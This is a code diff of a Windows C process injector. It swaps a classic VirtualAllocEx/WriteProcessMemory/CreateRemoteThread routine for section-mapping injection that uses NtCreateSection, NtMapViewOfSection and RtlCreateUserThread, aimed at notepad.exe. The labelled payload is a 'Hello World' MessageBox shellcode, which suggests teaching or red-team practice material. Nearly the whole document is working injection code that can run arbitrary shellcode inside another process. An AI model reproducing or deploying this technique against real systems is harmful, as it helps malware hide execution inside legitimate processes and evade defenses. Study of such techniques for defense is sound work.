@@ -1,10 +1,4 @@
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <tlhelp32.h>
-
-#define TARGET "notepad.exe"
+#include "injector.h"
 
 // "Hello World" MessageBox shellcode
 unsigned char payload[] = 
@@ -83,107 +77,168 @@ DWORD find_pid(const char* procname) {
     return pid;
 }
 
-// Inject payload into process
-int inject_shellcode(DWORD pid) {
-    DWORD bWritten = 0;
 
-    // Opens an existing local process object.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-    HANDLE hProc = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // Process Access Rights
-        FALSE, // Do not inherit handle     
-        pid    // PID of process to open
-    );
+// map section views injection
+int inject_section_view(DWORD pid) {
+	CLIENT_ID cid;
+    NTSTATUS status; 
+    HANDLE hThread = NULL;
+    HANDLE hSection = NULL;
+    PVOID pLocalView = NULL; 
+    PVOID pRemoteView = NULL;
 
-    if (INVALID_HANDLE_VALUE == hProc) {
-        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
+    // Resolve Functions
+    HMODULE hNtdll = GetModuleHandle("NTDLL.DLL");
+    if (IS_HANDLE_INVALID(hNtdll)) {
+        fprintf(stderr, "[!] GetModuleHandle() failed (0x%x)\n", GetLastError());
         return -1;
     }
 
-    // Reserves, commits, or changes the state of a 
-    // region of memory within the virtual address space of a specified process. 
-    LPVOID pRemoteCode = VirtualAllocEx(
-        hProc,                  // Handle to process to allocate memory to
-        NULL,                   // No desired starting address
-        payload_len,            // Size of memory to allocate
-        MEM_COMMIT,             // Make the specified memory range available for use by the process
-        PAGE_EXECUTE_READ       // R+X 
-    );
-        
-    if (NULL == pRemoteCode) {
-        fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
+	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(hNtdll, "NtCreateSection");
+    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(hNtdll, "NtMapViewOfSection");
+	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(hNtdll, "RtlCreateUserThread");
+
+    if (pNtCreateSection == NULL || pNtMapViewOfSection == NULL || pRtlCreateUserThread == NULL) {
+        fprintf(stderr, "[!] Failed to resolve functions\n");
         return -1;
     }
 
-    // Writes data to an area of memory in a specified process.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-    BOOL result = WriteProcessMemory(
-        hProc,                  // Handle to the process memory to be modified.
-        pRemoteCode,            // Pointer to the base address in the specified process to which data is written
-        (PVOID)payload,         // Pointer to the buffer that contains data to be written
-        (SIZE_T)payload_len,    // The number of bytes to be written
-        (SIZE_T *)&bWritten
+    printf("[i] 0x%p -> NtCreateSection\n", pNtCreateSection);
+    printf("[i] 0x%p -> NtMapViewOfSection\n", pNtMapViewOfSection);
+    printf("[i] 0x%p -> RtlCreateUserThread\n", pRtlCreateUserThread);
+
+	status = pNtCreateSection(
+        &hSection, 
+        SECTION_ALL_ACCESS, 
+        NULL, 
+        (PLARGE_INTEGER) &payload_len, 
+        PAGE_EXECUTE_READWRITE, 
+        SEC_COMMIT, 
+        NULL
     );
 
-    if (bWritten != payload_len) {
-        fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -2;
-    }
-        
-    if (!result) {
-        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -3;
-    }
-
-    // Creates a thread that runs in the virtual address space of another process.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
-    HANDLE hThread = CreateRemoteThread(
-        hProc,              // Handle to process
-        NULL,               // Thread gets a default security descriptor and the handle cannot be inherited
-        0,                  // Use default stack size
-        pRemoteCode,        // Pointer to memory where payload is written
-        NULL,               // No variables to be passed to the thread function
-        0,                  // The thread runs immediately after creation
-        NULL                // The thread identifier is not returned
-    );
-
-    if (hThread == NULL) {
-        fprintf(stderr, "[!] CreateRemoteThread() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -4;
-    }
-
-    // Wait for thread to finish execution
-    int _result = WaitForSingleObject(hThread, -1);
-    if (_result == WAIT_FAILED) {
-        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x)\n", GetLastError());
-        CloseHandle(hThread);        
-        CloseHandle(hProc);
-        return -5;
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtCreateSection() failed (0x%x)\n", status);
+        return -1;
     } 
+
+    if (IS_HANDLE_INVALID(hSection)) {
+        fprintf(stderr, "[!] NtCreateSection() failed to return a valid Section Handle\n");
+        return -1;
+    }
+
+    status = pNtMapViewOfSection(
+        hSection, 
+        GetCurrentProcess(), 
+        &pLocalView, 
+        NULL, 
+        NULL, 
+        NULL, 
+        (SIZE_T *) 
+        &payload_len, 
+        ViewUnmap,
+        NULL, 
+        PAGE_READWRITE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtMapViewOfSection() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        return -1;
+    } 
+
+    // Copy payload
+    memcpy(pLocalView, payload, payload_len);
+
+    // Open Handle to remote process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (IS_HANDLE_INVALID(hProcess)) {
+        fprintf(stderr, "[!] OpenProcess() failed! (0x%x)\n", GetLastError());
+        CloseHandle(hSection);
+        return -1;
+    }
+
+	// create remote section view (target process)
+	status = pNtMapViewOfSection(
+        hSection, 
+        hProcess, 
+        &pRemoteView, 
+        NULL, 
+        NULL, 
+        NULL, 
+        (SIZE_T *) 
+        &payload_len, 
+        ViewUnmap, 
+        NULL, 
+        PAGE_EXECUTE_READ
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtMapViewOfSection() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    } 
+
+
+	status = pRtlCreateUserThread(
+        hProcess, 
+        NULL, 
+        FALSE, 
+        0, 
+        0, 
+        0, 
+        pRemoteView, 
+        0, 
+        &hThread, 
+        &cid
+    );
+
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] RtlCreateUserThread() failed (0x%x)\n", status);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    } 
+
+    if (IS_HANDLE_INVALID(hThread)) {
+        fprintf(stderr, "[!] RtlCreateUserThread returned an Invalid Handle\n");
+        CloseHandle(hSection);
+        CloseHandle(hProcess);
+        return -1;
+    }
+
+	int _result = WaitForSingleObject(hThread, -1);
+    if (_result != 0) {
+        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
+        CloseHandle(hThread);
+        CloseHandle(hSection);
+        CloseHandle(hProcess);       
+        return -1;
+    } 
+
     CloseHandle(hThread);
-    CloseHandle(hProc);
+    CloseHandle(hSection);
+    CloseHandle(hProcess);
     return 0;
 }
 
-int main(void) {
+int main() {
     DWORD pid = find_pid(TARGET);
     
     if (pid == 0) {
         fprintf(stderr, "[!] No %s found\n", TARGET);
         return -1;
     }
-
+    
     printf("[i] %s: %d\n", TARGET, pid);
-
-    int result = inject_shellcode(pid);
+    
+    int result = inject_section_view(pid);
     if (result < 0) {
         fprintf(stderr, "[!] Failed to inject payload\n");
         return -2;
     }
+
     printf("[i] Injection Complete!\n");
     return 0;
 }
